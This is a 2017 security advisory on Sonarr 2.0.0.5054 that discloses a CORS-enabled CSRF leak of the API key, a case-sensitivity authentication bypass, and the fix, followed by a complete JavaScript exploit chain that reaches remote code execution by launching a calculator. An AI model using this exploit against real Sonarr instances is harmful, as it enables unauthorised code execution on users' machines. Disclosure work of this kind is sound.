# Web UI Vulnerabilities in Sonarr 2.0.0.5054

December 2017

[Sonarr](https://sonarr.tv/) is "a PVR for Usenet and BitTorrent users".

## CSRF (Cross-site Request Forgery)

The local web UI of Sonarr 2.0.0.5054 includes the user's API key in its
pages' HTML so that it can be included in XHR requests.

Sonarr checks for it to block cross-site requests to most URLs, but that
check can be bypassed because the pages are sent with the CORS header
`Access-Control-Allow-Origin: *`. That allows a website visited by the
user to forge a local request for one of Sonarr's pages and read the API
key from the response.

```Javascript
req = new XMLHttpRequest();
req.open('GET', 'http://localhost:8989/Content/', false);
req.send(null);
console.log(req.responseText.match(/\s+ApiKey\s*:.*/));
```

## Authentication Bypass

Sonarr has authentication disabled by default. Users can enable either
HTTP or form-based authentication, but both can be bypassed, even when
the user is logged out, due to a bug in
[RequestExtensions.cs](https://github.com/Sonarr/Sonarr/blob/v2.0.0.5054/src/NzbDrone.Api/Extensions/RequestExtensions.cs).

`RequestExtensions.cs` uses a case-insensitive comparison to decide
whether a URL points to static content and should be accessible without
authentication.

```C#
public static bool IsContentRequest(this Request request)
{
    return request.Path.StartsWith("/Content/", StringComparison.InvariantCultureIgnoreCase);
}
```

However,
[StaticResourceMapper.cs](https://github.com/Sonarr/Sonarr/blob/v2.0.0.5054/src/NzbDrone.Api/Frontend/Mappers/StaticResourceMapper.cs)
then decides whether the URL should be handled as static content using a
case-sensitive comparison.

```C#
public override bool CanHandle(string resourceUrl)
{
    return resourceUrl.StartsWith("/Content") ||
           resourceUrl.EndsWith(".js") ||
           resourceUrl.EndsWith(".css") ||
           (resourceUrl.EndsWith(".ico") && !resourceUrl.Equals("/favicon.ico")) ||
           resourceUrl.EndsWith(".swf");
}
```

A request with the path `/content/` rather than `/Content/` won't
require authentication, but also won't be handled as static content. The
response will have the `Access-Control-Allow-Origin: *` header and
include the API key, so the CSRF attack will work as it did before
enabling authentication.

This also allows attackers to read the API key of network-accessible
Sonarr instances without user interaction by requesting
`http://victim:8989/content/`. The attacker can then execute code
remotely by directly making the same API requests that are made with
CSRF in the exploit below.

## Fix

Fixed in
[v2.0.0.5153](https://github.com/Sonarr/Sonarr/releases/tag/v2.0.0.5153).
Thanks to @Taloth and @markus101 for getting this fixed extremely quickly and
thoroughly:
<https://github.com/Sonarr/Sonarr/commits?since=2017-12-07T00:00:00Z&until=2017-12-13T19:20:00Z>.
(The two later commits address a case-sensitivity issue similar to the one
above, which we missed in the initial fix.)

## Remote Code Execution

Sonarr can be configured to run a local executable after it starts
downloading a TV show. After obtaining the API key, a malicious website
can forge API requests that configure the path to an executable to run
and the arguments to pass it. It can then forge requests to download a
TV show, which will make Sonarr run the executable.

The given path can point to any executable and any arguments are
allowed, so code execution is straightforward. The executable will run
under the same user account as Sonarr.

Below is the full proof-of-concept/exploit. Tested with [Sonarr
2.0.0.5054](https://github.com/Sonarr/Sonarr/tree/v2.0.0.5054) in
Firefox.

```Javascript
// Get a Sonarr page and read the API key from the HTML.
const apiKeyReq = new XMLHttpRequest();
apiKeyReq.open('GET', 'http://localhost:8989/cOnTeNt/', false);

try {
    apiKeyReq.send(null);
} catch (e) {
    document.write(e + '<br><br>');
}

// Find "ApiKey     : 'abcdef0123456789abcdef0123456789'".
const apiKey =
    apiKeyReq.responseText.match(/\s+ApiKey\s*:\s*'([a-f0-9]*)'/)[1];

document.write('API key: ' + apiKey + '<br><br>');

// Makes a CSRF POST request to the Sonarr API.
const post = (apiEndpoint, body) => {
    const req = new XMLHttpRequest();
    const url = 'http://localhost:8989/api/' + apiEndpoint +
                '?apikey=' + apiKey;

    req.open('POST', url, false);

    req.setRequestHeader('X-Api-Key', apiKey);
    req.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    req.setRequestHeader('Content-Type', 'application/json');

    try {
        req.send(JSON.stringify(body));
    } catch (e) {
        document.write(e + '<br><br>');
    }

    if (req.status === 200 || req.status === 201) { // HTTP 201: Created
        document.write('Response:<pre>' + req.responseText +
                       '</pre><br>');
        return req.responseText;
    } else {
        document.write('Request to ' + url + ' failed: ' + req.status +
                       ' ' + req.statusText + '<br><br>');
        return null;
    }
};

// Set Sonarr to launch calc.exe after downloading an episode.
const calc = (() => {
    if (navigator.appVersion.indexOf('Win') !== -1) {
        // Haven't tested this.
        return 'C:\\Windows\\System32\\calc.exe';
    } else if (navigator.appVersion.indexOf('Mac') !== -1) {
        return '/Applications/Calculator.app/Contents/MacOS/Calculator';
    } else {
        return prompt('Path to a local executable to run:');
    }
})();

document.write('Adding ' + calc +
               ' as a post-processing script.<br><br>');

post('notification',
     {
         onGrab: true,
         onDownload: true,
         onUpgrade: true,
         onRename: true,
         supportsOnGrab: true,
         supportsOnDownload: true,
         supportsOnUpgrade: true,
         supportsOnRename: true,
         tags: [],
         name: 'CalculatorForRCE' + Math.random(),
         fields: [
             {
                 order: 0,
                 name: 'Path',
                 label: 'Path',
                 type: 'filepath',
                 advanced: false,
                 value: calc
             },
             {
                 order: 1,
                 name: 'Arguments',
                 label: 'Arguments',
                 helpText: 'Arguments to pass to the script',
                 type: 'textbox',
                 advanced: false,
                 value: ''
             }
         ],
         implementationName: 'Custom Script',
         implementation: 'CustomScript',
         configContract: 'CustomScriptSettings',
         infoLink: 'http://example.com',
         presets: []
     });

// Add a show so we can try to trigger a download.
document.write('Adding a TV show. (The West Wing.)<br><br>');

const seriesResp =
    post('series',
         {
             tvdbId: 72521,
             title: 'The West Wing',
             qualityProfileId: 1,
             titleSlug: 'the-west-wing',
             images: [],
             monitored: false,
             seasons: [],
             path: ((navigator.appVersion.indexOf('Win') !== -1) ?
                   'C:\\' : '/tmp')
         });

// Download something so Sonarr will run the executable.
document.write('Downloading an episode.<br><br>');

try {
    // Get the ID of an episode.
    const episodeReq = new XMLHttpRequest();
    const seriesID = JSON.parse(seriesResp)['id'];

    let episodeResp = null;

    while (!episodeResp || episodeResp === '[]') {
        episodeReq.open('GET',
                        'http://localhost:8989/api/episode?apikey=' +
                        apiKey + '&seriesId=' + seriesID,
                        false);
        episodeReq.send(null);
        episodeResp = episodeReq.responseText;
    }

    const episodeID = JSON.parse(episodeResp)[55]['id'];

    // Tell Sonarr to download the episode.
    const success = post('command',
                         {
                             name: 'episodeSearch',
                             episodeIds: [episodeID]
                         });

    if (success) {
        document.write('Seems like it might have worked. There\'ll ' +
                       'be a short delay while Sonarr starts ' +
                       'downloading the episode.');
    }
} catch (e) {
    document.write(e);
}
```

